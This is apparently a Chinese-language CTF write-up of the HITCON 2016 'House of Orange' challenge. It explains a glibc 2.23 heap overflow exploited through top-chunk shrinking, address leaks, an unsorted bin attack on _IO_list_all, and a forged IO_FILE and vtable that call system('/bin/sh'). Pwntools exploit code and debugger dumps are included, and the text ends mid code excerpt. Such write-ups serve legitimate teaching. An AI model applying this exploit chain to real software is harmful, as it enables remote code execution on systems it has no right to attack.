# House Of Orange

## 来源
2016 ctf-HITCON

## 环境

libc: libc.2.23

Unbuntu16




## 难度

8 / 10



## 保护

 ```sh
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
 ```



## 简单描述

保护全开,有添加功能和编辑功能,只能添加4次,每次添加都会malloc三次分别储存不同的信息, 可以编辑三次,没有free函数,是经典的 House Of Orange漏洞利用类型.



## vul

```c
  length = InputNum();
  if ( length > 0x1000 )
    length = 4096;                              // vul
  printf("Name:");
  InputContent((void *)qword_203068[1], length);
```

申请大小小于0x1000时,存在堆溢出漏洞.



## 知识点

House of orange ( modify top chunk realize free, unsoted bin attack, small bin attack, IO_FILE)



## 思路

使用堆溢出修改top chunk大小(按照内存对其), 再申请一个大小大于top chunk size 的chunk,然而old top chunk就会被free掉,申请一个large bin大小的chunk,由于large bin申请成功后fd_nextsize和bk_nextsize会指向自身地址,可以泄漏heap地址,然而,申请的位置也恰好含有以前所剩的main_arena信息,所以直接打印即可泄漏libc. 后面就通过unsorted bin attack修改IO_list_all为main_arena + 0x58, 然后根据small bin管理机制,修改main_arena  + 0x58处的fake IO_FILE的chain的值指向伪造的IO_FILE,而使伪造堆块满足fp->`_mode` <= 0 && fp->`_IO_write_ptr` > fp->`_IO_write_base` 然后会调用vtable中的`__overflow` 函数,然而我们可以伪造再一个vtable,实现在调用`__overflow`的时候调用我们的函数,这里函数就改为system,传入参数需要在伪造的IO_FILE头部写入'/bin/sh\x00'然后在unsoretd bin被破坏之后再次申请时报错, 那触发异常就会打印错误信息,`malloc_printerr`是`malloc`中用来打印错误的函数，而 malloc_printerr`其实是调用` `__libc_message`函数之后调用`abort`函数，`abort`函数其中调用了`_IO_flush_all_lockp`, 然后根据`IO_list_all`中的值去遍历IO_FILE调用IO_FILE 的vtable中的 `__overflow`函数指针, 然后就可以调用system 传入 '/bin/sh\00' get shell



## 利用

### 准备

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'houseoforange'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'
#libFile = './libc64-2.19.so'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('Your choice : ', str(1))
	sla('name :', str(size))
	sa('Name :', data)
	sla('Price of Orange:', str(16))
	sla('Orange:', '1');


def md(size, data):
	sla('Your choice : ', str(3))
	sla('name :', str(size))
	sa('Name:', data)
	sla('Price of Orange:', str(16))
	sla('Orange:', '1');

def dp():
	sla('Your choice : ', str(2))

def q():
	sla(':', str(5))	
```



### 修改top chunk size实现free的效果

#### 原理

House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin),这种操作的原理简单来说是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins

来看一下这个过程的详细情况，假设目前的top chunk已经不满足malloc的分配需求。 首先我们在程序中的`malloc`调用会执行到libc.so的`_int_malloc`函数中，在`_int_malloc`函数中，会依次检验fastbin、small bins、unsorted bin、large bins是否可以满足分配要求，因为尺寸问题这些都不符合。接下来`_int_malloc`函数会试图使用top chunk，在这里top chunk也不能满足分配的要求，因此会执行如下分支。

```c
/*
Otherwise, relay to handle system-dependent cases
*/
else {
      void *p = sysmalloc(nb, av);
      if (p != NULL && __builtin_expect (perturb_byte, 0))
    alloc_perturb (p, bytes);
      return p;
}
```

此时ptmalloc已经不能满足用户申请堆内存的操作，需要执行sysmalloc来向系统申请更多的空间。 但是对于堆来说有mmap和brk两种分配方式，需要让堆以brk的形式拓展，之后原有的top chunk会被置于unsorted bin中。

综上，要实现brk拓展top chunk，但是要实现这个目的需要绕过一些libc中的check，首先，malloc的尺寸不能大于`mmp_.mmap_threshold`

```c
if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max))
```

如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。

在sysmalloc函数中存在对top chunk size的check，如下

```c
assert((old_top == initial_top(av) && old_size == 0) ||
     ((unsigned long) (old_size) >= MINSIZE &&
      prev_inuse(old_top) &&
      ((unsigned long)old_end & pagemask) == 0));
```

这里检查了top chunk的合法性，如果第一次调用本函数，top chunk可能没有初始化，所以可能old_size为0，如果top chunk已经初始化了，那么top chunk的大小必须大于等于MINSIZE，因为top chunk中包含了  fencepost，所以top chunk的大小必须要大于MINSIZE。其次Top  chunk必须标识前一个chunk处于inuse状态，并且top chunk的结束地址必定是页对齐的。此外top  chunk除去fencepost的大小必定要小于所需chunk的大小，否则在_int_malloc()函数中会使用top  chunk分割出chunk

总结一下伪造的top chunk size的要求

1.伪造的size必须要对齐到内存页

2.size要大于MINSIZE(0x10)

3.size要小于之后申请的chunk size + MINSIZE(0x10)

4.size的prev inuse位必须为1

之后原有的top chunk就会执行`_int_free`从而顺利进入unsorted bin中

回到题中,就要得满足以上要求


```sh
pwndbg> x /40gx 0x555555758060
0x555555758060:	0x0000000000000000	0x0000000000020fa1
0x555555758070:	0x0000000000000000	0x0000000000000000
0x555555758080:	0x0000000000000000	0x0000000000000000
0x555555758090:	0x0000000000000000	0x0000000000000000
0x5555557580a0:	0x0000000000000000	0x0000000000000000
0x5555557580b0:	0x0000000000000000	0x0000000000000000
```

然而 0x555555758060 + 0x0000000000020fa1 ==  0x555555779001 , 去掉inuse位,则内存是按照0x1000对齐的,则我们所能修改top chunk的大小就可以为: (x * 0x1000 + 0x20fa1) > MINSIZE(0x10) (x 属于 整数),题中在添加的时候,最多只能申请大小为0x1000,那我们就通过堆溢出把top chunk size 改为: 0x0fa1, 然后再申请大于这个top chunk size的chunk就可以实现top chunk free后成为unsoted bin 

```python
	ad(0x10, 'A' * 0x10)
	p = 'A' * 0x10
	p += p64(0) + p64(0x21) #后一个储存颜色的chunk
	p += p64(0x1f00000010)
	p += p64(0)
	p += p64(0) # top chunk pre_size
	p += p64(0x00fa1) # top chunk size
    md(0x80, p) # 堆溢出修改top chunk size
```
实现如下

```c
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x5555557580a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557580a0
smallbins
empty
largebins
empty
```



### Leak libc and heap addr

申请一个小于刚才释放 unsoted bin 大小的一个chunk,根据unsoted bin的分割特性,会把main_arena转移,且不会清空chunk 的fd和bk的内容,所以main_arena还存在,直接打印即可获取main_arena地址泄漏libc,但在添加的时候要输入内容,为了得到完整的main_arena地址信息,就填充8个字符到chunk bk位置从而泄漏完整地址, 为了后面要采取伪造fake IO_FILE结构,就要得修改vtable指向当前伪造的虚函数表,那就要得知道heap地址了, 那怎么泄漏 heap地址呢? 由于large bin 大小的chunk有一个特点,申请成功的chunk 的 fd_nextsize和bk_nextsize会填充为自己的地址

large bin申请成功后,会向fd_nextsize和bk_nextsize填充自己的地址代码如下:

```c
/* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
                  //这里若申请的是符合large bin大小的chunk
                  if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                    {
                      //向后退两个chunk, 而fwd->fd == victim
                      fwd = bck; 
                      bck = bck->bk; // bck->fd =fwd->bk
					  //这里的victim 的值就是chunk的申请到的地址
                      victim->fd_nextsize = fwd->fd; //还是填充自己本身地址
                      victim->bk_nextsize = fwd->fd->bk_nextsize;  //填充之后,再取出来继续填充一样的地址,还是本身地址.
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; 
                    }
                  else
                    {
                      assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      while ((unsigned long) size < fwd->size)
                        {
                          fwd = fwd->fd_nextsize;
                          assert ((fwd->size & NON_MAIN_ARENA) == 0);
                        }

                      if ((unsigned long) size == (unsigned long) fwd->size)
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }
```



成功malloc(0x400)后填充'C' * 8 的堆数据如下

```sh
pwndbg> x /40gx 0x5555557580c0
0x5555557580c0:	0x0000000000000000	0x0000000000000411
0x5555557580d0:	0x4343434343434343	0x00007ffff7dd2188 # main_arena + 88
0x5555557580e0:	0x00005555557580c0	0x00005555557580c0 # self heap addr
```



利用

```python
	# leak libc base with overflow
	ad(0x400, 'C' * 0x8)
	dp()
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - main_arena - 1640
	li('libc_base ' + hex(lib.address))
    
    # leak heap addr with large bin
	md(0x10, 'C' * 0x10)
	dp()
	ru('CCCCCCCCCCCCCCCC')
	heap = u64(ru('\x0a').ljust(8, '\x00')) - 0xc0
	li('heap ' + hex(heap))
```



### 触发异常劫持控制流程

怎么触发呢? 只要破坏unsorted bin 链表结构,再次申请时就会触发异常,那触发异常就会打印错误信息,`malloc_printerr`是`malloc`中用来打印错误的函数，而 malloc_printerr`其实是调用` `__libc_message`函数之后调用`abort`函数，`abort`函数其中调用了`_IO_flush_all_lockp`, 然后根据`IO_list_all`中的值去遍历IO_FILE调用IO_FILE 的vtable中的 `__overflow`函数指针

### unsorted bin attack 修改 `_IO_list_all`

如何进行劫持,采用修改old top chunk 的结构,使之报错,然而我们只需要采用unsorted bin attack修改`_IO_list_all`的值为unsorted_chunks(av)也就是main_arena + 0x58.修改这个有什么用? 本来`_IO_list_all`的值是指向`_IO_2_1_stderr`,若修改这个值,那么在malloc报错的时候就会遍历`_IO_list_all` 指向的IO_FILE结构体，详细后面会说道.

unsorted bin attack 实现攻击源码

```c
 if (in_smallbin_range(nb) && bck == unsorted_chunks(av) &&
                victim == av->last_remainder &&
                (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) {
                ....
            }

            /* remove from unsorted list */
            unsorted_chunks(av)->bk = bck;
            bck->fd                 = unsorted_chunks(av); //实现想目标处修改值
```



实现修改如下

```sh
pwndbg> x /10gx &_IO_list_all
0x7ffff7dd2520 <_IO_list_all>:	0x00007ffff7dd1b78	0x0000000000000000
0x7ffff7dd2530:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2540 <_IO_2_1_stderr_>:	0x00000000fbad2086	0x0000000000000000
0x7ffff7dd2550 <_IO_2_1_stderr_+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2560 <_IO_2_1_stderr_+32>:	0x0000000000000000	0x0000000000000000

pwndbg> x /10gx 0x00007ffff7dd1b78
0x7ffff7dd1b78 <main_arena+88>:	0x000055555577a010	0x00005555557584f0
0x7ffff7dd1b88 <main_arena+104>:	0x00005555557584f0	0x00007ffff7dd2510
0x7ffff7dd1b98 <main_arena+120>:	0x00007ffff7dd1b88	0x00007ffff7dd1b88
0x7ffff7dd1ba8 <main_arena+136>:	0x00007ffff7dd1b98	0x00007ffff7dd1b98
0x7ffff7dd1bb8 <main_arena+152>:	0x00007ffff7dd1ba8	0x00007ffff7dd1ba8
```



利用

```python
	# Control program
	p = 'B' * 0x400
	p += p64(0)
	p += p64(0x21)
	p += 'B' * 0x10

	# fake file
	f = p64(0)		   # old top chunk prev_size
	f += p64(0x100)    # old top chunk size
	f += p64(0) + p64(_IO_list_all - 0x10) # unsoted bin attack实现修改 _IO_list_all
```



### 劫持流程

若下次申请大小为0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 <= 2*SIZE_SZ，就会触发malloc_printerr

```c
for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",// 执行该函数
                             chunk2mem (victim), av);
          size = chunksize (victim);
```



那么在执行malloc_printerr函数就会执行到`_IO_flush_all_lockp`, 来了解一下`_IO_flush_all_lockp` 函数

```c
int _IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;
#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif
   //循环遍历IO_FILE,采用 fp->chain来进行获取下一个IO_FILE, 那么
  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
        _IO_flockfile (fp);
      //check, 在后面伪造的IO_FILE中需要绕过,然后执行 _IO_OVERFLOW (fp, EOF) == EOF)
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) 
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base))
           )
          && _IO_OVERFLOW (fp, EOF) == EOF) //参数传入IO_FILE的地址和EOF
        result = EOF;
      if (do_lock)
        _IO_funlockfile (fp);
      run_fp = NULL;
    }
#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif
  return result;
}
```

在`_IO_flush_all_lockp`函数中会根据`_IO_list_all`中的值,依次遍历IO_FILE,那我们就想法设法构建自己的IO_FILE,若IO_FILE满足fp->`_mode` <= 0 && fp->`_IO_write_ptr` > fp->`_IO_write_base` 然后会调用vtable中的`__overflow` 函数,我们就可以伪造一个vtable,实现在调用`__overflow`的时候调用我们的函数



来了解一下IO_FILE_plus结构体.


```c
struct _IO_FILE_plus （size_of=0x78+0x8）
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
 
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;//储存下一个IO_FILE的地址,这是关键,后面采用一种方法实现main_arena + 88的IO_FILE结构体的这个值指向我们所构造的fake IO_FILE

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION && _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;
# endif
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};
```



vtable表中结构

```sh
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow); //后面通过伪造IO_FILE使 会调用此函数指针,就修改这个为system
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

后面就将这个`__overflow` 修改为system, 然而在调用这些函数指针的时候,传入的参数是IO_FILE的地址,所以后面我们需要在自己伪造的IO_FILE的头部填入'/bin/sh\x00',若能使`_IO_flush_all_lockp`函数在遍历的时候遍历到我们伪造的IO_FILE,且IO_FILE满足`_IO_overflow`函数的调用条件, 这样就能实现get shell,那么怎样才能让我们伪造的IO_FILE连接到我们自己伪造的IO_FILE呢? 

那使用unsorted bin attack修改`_IO_list_all`中main_arena + 0x58,后面就要得修改main_arena + 0x58处fkae IO_FILE的 chain为我们的fake IO_FILE地址,这样在执行`_IO_flush_all_lockp`就会根据自己伪造的IO_FILE调用我们所伪造的vtable函数了.但关键是怎样使`_IO_flush_all_lockp` 在遍历 IO_FILE的时候能遍历到我们伪造的IO_FILE,就要靠下面的操作了.



### 修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE

上面的`_chain` 的值是我们重点要如何在main_arena + 0x58处IO_FILE中设置这个值为咱们可以掌控的fake IO_FILE地址,然而unsorted bin的链表结构已经被破坏,再次申请的时候,old top chunk就不受unsorted bin 管理,注意若大小小于0x400 的bin的管理顺序为unsorted bin -> small bin,若我们修改old top chunk size 为小于0x400,就可以让当前chunk受small bin进行管理,而在small bin管理的时候, 各个大小的bin的链表头部地址会储存在main_arena中,若我们想要实现修改 main_arena + 0x58处 IO_FILE中的 `_chain`的值,就需要靠small bin的管理机制来进行修改

 	若我们能够计算好大小,就能实现在main_arena部分内存中储存我们的chunk地址.下面为修改old top chunk大小为0x50所看到main_arena + 0x58中IO_FILE的结构

```sh
pwndbg> p *((struct _IO_FILE_plus*)((long int)&main_arena + 0x58))
$4 = {
  file = {
    _flags = 1433903120, 
    _IO_read_ptr = 0x5555557584f0 "/bin/sh", 
    _IO_read_end = 0x5555557584f0 "/bin/sh", 
    _IO_read_base = 0x7ffff7dd2510 "", 
    _IO_write_base = 0x7ffff7dd1b88 <main_arena+104> "\360\204uUUU", 
    _IO_write_ptr = 0x7ffff7dd1b88 <main_arena+104> "\360\204uUUU", 
    _IO_write_end = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_base = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_end = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_save_base = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_backup_base = 0x5555557584f0 "/bin/sh", # 这是small bin管理时,储存我们的堆地址
    _IO_save_end = 0x5555557584f0 "/bin/sh",    # 这是small bin管理时,储存我们的堆地址
    _markers = 0x7ffff7dd1bc8 <main_arena+168>, 
    _chain = 0x7ffff7dd1bc8 <main_arena+168>,  # 下一个IO_FILE的地址,这是我们想要覆盖当前地址为old top chunk addr
    _fileno = -136504360, 
    _flags2 = 32767, 
    _old_offset = 140737351850968, 
    _cur_column = 7144, 
    _vtable_offset = -35 '\335', 
    _shortbuf = <incomplete sequence \367>, 
    _lock = 0x7ffff7dd1be8 <main_arena+200>, 
    _offset = 140737351851000, 
    _codecvt = 0x7ffff7dd1bf8 <main_arena+216>, 
    _wide_data = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_list = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_buf = 0x7ffff7dd1c18 <main_arena+248>, 
    __pad5 = 140737351851032, 
    _mode = -136504280, 
    _unused2 = "\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000"
  }, 
  vtable = 0x7ffff7dd1c38 <main_arena+280>
}
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0
BK: 0x7ffff7dd2510 ◂— 0x0
smallbins
0x50: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0 #释放后由small bin来管理
largebins
empty

```



那么还差0x10,就改old top chunk size 为0x60,即可在main_arena 向下偏移0x10进行储存,这就实现了在main_arena + 0x58伪造IO_FILE中实现连接我们伪造的IO_FILE,实现效果如下

```sh
pwndbg> p *((struct _IO_FILE_plus*)0x00007ffff7dd1b78)
$2 = {
  file = {
    _flags = 1433903120, 
    _IO_read_ptr = 0x5555557584f0 "/bin/sh", 
    _IO_read_end = 0x5555557584f0 "/bin/sh", 
    _IO_read_base = 0x7ffff7dd2510 "", 
    _IO_write_base = 0x7ffff7dd1b88 <main_arena+104> "\360\204uUUU", 
    _IO_write_ptr = 0x7ffff7dd1b88 <main_arena+104> "\360\204uUUU", 
    _IO_write_end = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_base = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_end = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_save_base = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_backup_base = 0x7ffff7dd1bb8 <main_arena+152> "\250\033\335\367\377\177", 
    _IO_save_end = 0x7ffff7dd1bb8 <main_arena+152> "\250\033\335\367\377\177", 
    _markers = 0x5555557584f0, 
    _chain = 0x5555557584f0,  //这里指向 old top chunk,也就是我们伪造的堆块
    _fileno = -136504360, 
    _flags2 = 32767, 
    _old_offset = 140737351850968, 
    _cur_column = 7144, 
    _vtable_offset = -35 '\335', 
    _shortbuf = <incomplete sequence \367>, 
    _lock = 0x7ffff7dd1be8 <main_arena+200>, 
    _offset = 140737351851000, 
    _codecvt = 0x7ffff7dd1bf8 <main_arena+216>, 
    _wide_data = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_list = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_buf = 0x7ffff7dd1c18 <main_arena+248>, 
    __pad5 = 140737351851032, 
    _mode = -136504280, 
    _unused2 = "\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000"
  }, 
  vtable = 0x7ffff7dd1c38 <main_arena+280>
}
pwndbg> x /40gx 0x5555557584f0
0x5555557584f0:	0x0068732f6e69622f	0x0000000000000061 # 我们的old top chunk
0x555555758500:	0x00007ffff7dd1bc8	0x00007ffff7dd1bc8
0x555555758510:	0x0000000000000000	0x0000000000000001
0x555555758520:	0x0000000000000000	0x0000000000000000
0x555555758530:	0x0000000000000000	0x0000000000000000
0x555555758540:	0x0000000000000000	0x0000000000000000
0x555555758550:	0x0000000000000000	0x0000000000000000
```

利用如下:

```python
	# Control program
	p = 'B' * 0x400
	p += p64(0)
	p += p64(0x21)
	p += 'B' * 0x10

	# fake IO_FILE
	f = '/bin/sh\x00' # overflow arg -> system('/bin/sh') 这是后续调用system会传入IO_FILE的地址
	f += p64(0x61)    # small bin size,使main_arena + 0x58 fake IO_FILE的_chian指向当前伪造的IO_FILE
    
	f += p64(0) + p64(_IO_list_all - 0x10) # unsoted bin attack 修改 _IO_list_all为main_arena + 0x58
```



### 伪造IO_FILE

上面就实现了修改main_arena + 0x58 中 fake IO_FILE的`_chain`指向我们的old top chunk,那么就在old top chunk伪造IO_FILE,在伪造的时候必须要得通过检查

```c
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) 
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base))
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)
        result = EOF;
```

则fp->`_mode` <= 0 且fp->`_IO_write_ptr` > fp->`_IO_write_base` 且`_IO_vtable_offset` (fp) == 0,这样才能执行`_IO_OVERFLOW (fp, EOF) == EOF)`

那么利用就可以这样写

```python
# fake file
	f = '/bin/sh\x00' # flag overflow arg -> system('/bin/sh')
	f += p64(0x61)    # _IO_read_ptr small bin size
	#  unsoted bin attack
	f += p64(0) # _IO_read_end)
	f += p64(_IO_list_all - 0x10)  # _IO_read_base

	#bypass check
	# 使fp->_IO_write_base < fp->_IO_write_ptr绕过检查
	f += p64(0) # _IO_write_base 
	f += p64(1) # _IO_write_ptr

	f += p64(0) # _IO_write_end
	f += p64(0) # _IO_buf_base
	f += p64(0) # _IO_buf_end
	f += p64(0) # _IO_save_base
	f += p64(0) # _IO_backup_base
	f += p64(0) # _IO_save_end
	f += p64(0) # *_markers
	f += p64(0) # *_chain

	f += p32(0) # _fileno
	f += p32(0) # _flags2

	f += p64(1)  # _old_offset

	f += p16(2) # ushort _cur_colum;
	f += p8(3)  # char _vtable_offset
	f += p8(4)  # char _shrotbuf[1]
	f += p32(0) # null for alignment

	f += p64(0) # _offset
	f += p64(6) # _codecvt
	f += p64(0) # _wide_data
	f += p64(0) # _freeres_list
	f += p64(0) # _freeres_buf

	f += p64(0) # __pad5
	f += p32(0) # _mode 为了绕过检查,fp->mode <=0 ((addr + 0xc8) <= 0)
	f += p32(0) # _unused2
    
```

修改结果如下

```sh
pwndbg> p *((struct _IO_FILE_plus*)0x5555557584f0)
$1 = {
  file = {
    _flags = 1852400175, 
    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, 
    _IO_read_end = 0x0, 
    _IO_read_base = 0x7ffff7dd2510 "", 
    _IO_write_base = 0x0, 
    _IO_write_ptr = 0x1 <error: Cannot access memory at address 0x1>, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x0, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0, 
    _flags2 = 0, 
    _old_offset = 1, 
    _cur_column = 2, 
    _vtable_offset = 3 '\003', 
    _shortbuf = "\004", 
    _lock = 0x0, 
    _offset = 6, 
    _codecvt = 0x0, 
    _wide_data = 0x0, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0, 
    _mode = 0, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x5555557585c8
}

```


### 伪造 vtable

```python
	p += f
	p += p64(0) * 3 # alignment to vtable
	p += p64(heap + 0x5c8) # vtable指向自己
	p += p64(0) * 2
	p += p64(lib.sym['system']) # _IO_overflow 位置改为system
    md(0x600, p) # 修改一系列所伪造好的布局
    
```

修改结果如下

```sh
pwndbg> p *((struct _IO_FILE_plus*)0x5555557584f0).vtable
$2 = {
  __dummy = 93824994346440, 
  __dummy2 = 0, 
  __finish = 0x0, 
  __overflow = 0x7ffff7a52390 <__libc_system>, #成功修改为system
  __underflow = 0x0, 
  __uflow = 0x0, 
  __pbackfail = 0x0, 
  __xsputn = 0x0, 
  __xsgetn = 0x0, 
  __seekoff = 0x0, 
  __seekpos = 0x0, 
  __setbuf = 0x0, 
  __sync = 0x0, 
  __doallocate = 0x0, 
  __read = 0x0, 
  __write = 0x0, 
  __seek = 0x0, 
  __close = 0x0, 
  __stat = 0x0, 
  __showmanyc = 0x0, 
  __imbue = 0x0
}

```

### getshell

再次申请 0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 <= 2*SIZE_SZ，就会触发malloc_printerr,然后就开始执行各种已经布局好的各种trick,最终执行到system get shell

```c
for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
